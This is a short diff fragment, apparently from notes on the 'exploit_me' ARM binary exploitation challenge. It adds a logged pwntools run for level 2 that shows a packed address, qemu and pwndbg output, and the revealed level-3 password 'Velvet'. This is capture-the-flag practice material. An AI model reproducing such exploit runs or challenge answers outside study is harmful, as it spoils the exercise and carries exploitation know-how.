@@ -634,6 +634,16 @@ else:
 
 ''' To Do (TX) '''
 
+'''
+└─$ level2/l2.py
+b'\xd4\x12\x01\x00'
+[+] Starting local process '/usr/bin/qemu-arm': pid 3029564
+[*] running in new terminal: ['/usr/local/bin/pwndbg', '-q', '-x', '/tmp/pwnlib-gdbscript-swebtl8s.gdb']
+[+] Receiving all data: Done (27B)
+[*] Stopped process '/home/dvader/exploit_me/bin/exploit' (pid 3029564)
+b'Level 3 Password: "Velvet"\n'
+'''
+
 
 ```
 # exploit_me ARM binary - level 3:
